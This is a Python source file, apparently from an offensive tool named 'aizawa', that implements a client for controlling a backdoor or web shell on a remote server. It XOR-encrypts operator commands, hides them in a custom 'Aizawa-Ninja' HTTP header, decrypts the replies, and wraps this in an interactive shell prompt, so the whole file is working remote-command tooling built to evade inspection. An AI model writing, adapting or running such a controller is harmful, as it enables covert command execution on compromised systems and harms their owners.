import sys
from typing import Optional
from aizawa.http.client import HttpClient
from aizawa.utils.colors import Colors

class Executor:
    @staticmethod
    def xor_encrypt(data: str, key: str) -> str:
        encrypted = ''
        for i in range(len(data)):
            encrypted += chr(ord(data[i]) ^ ord(key[i % len(key)]))
        return ''.join([format(ord(char), '02x') for char in encrypted])

    @staticmethod
    async def execute(client: HttpClient, url: str, cmd: str, type: str, key: str) -> Optional[str]:
        if type.startswith("http_aizawa_ninja"):
            if type == "http_aizawa_ninja_eval":
                encrypted_cmd = Executor.xor_encrypt(f"system~{cmd}", key)
            else:
                encrypted_cmd = Executor.xor_encrypt(cmd, key)

            headers = {"Aizawa-Ninja": encrypted_cmd}
            result = await client.request("GET", url, headers=headers)

            if result:
                # Check if the result is a valid hex string
                if all(c in '0123456789abcdefABCDEF' for c in result.strip()):
                    try:
                        # Decrypt the response using the same key
                        encrypted_chars = []
                        for i in range(0, len(result), 2):
                            hex_char = result[i:i+2]
                            if hex_char:  # Make sure we have a complete hex pair
                                encrypted_chars.append(chr(int(hex_char, 16)))

                        encrypted_str = ''.join(encrypted_chars)
                        decrypted_result = ''
                        for i in range(len(encrypted_str)):
                            decrypted_result += chr(ord(encrypted_str[i]) ^ ord(key[i % len(key)]))
                        return decrypted_result
                    except ValueError:
                        return result  # Return original result if decryption fails
                else:
                    return result  # Return original result if it's not in hex format

            return f"{Colors.RED}ERROR{Colors.CLEAR}"
        return None

    @staticmethod
    async def execute_commands(client: HttpClient, url: str, type: str, user: str, host: str, pwd: str, key: str) -> None:
        while True:
            cmd = input(f"\n{Colors.BOLD}{Colors.YELLOW}{user}{Colors.CLEAR}@{Colors.BOLD}{Colors.BLUE}{host}{Colors.CLEAR} {Colors.PURPLE}{pwd}{Colors.CLEAR} % ")
            if cmd in ["exit", "quit", "\x03"]:
                sys.exit(print(f"{Colors.BOLD}{Colors.RED}Exiting...{Colors.CLEAR}"))
            if not cmd:
                continue
            result = await Executor.execute(client, url, cmd, type, key)
            print(f"\n{Colors.CYAN}{result}{Colors.CLEAR}")
